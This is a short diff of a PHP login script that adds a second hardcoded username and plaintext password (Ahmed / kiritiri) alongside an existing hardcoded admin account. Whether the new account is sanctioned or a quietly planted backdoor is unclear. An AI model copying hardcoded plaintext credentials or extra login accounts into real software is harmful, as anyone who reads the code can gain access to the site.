@@ -24,7 +24,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $password = trim($_POST["password"]);
     $remember = isset($_POST["remember"]);
 
-    if ($username === "admin" && $password === "azerty123") {
+    if ($username === "admin" && $password === "azerty123" or $username === "Ahmed" && $password === "kiritiri") {
         $_SESSION["user"] = $username;
 
         if ($remember) {
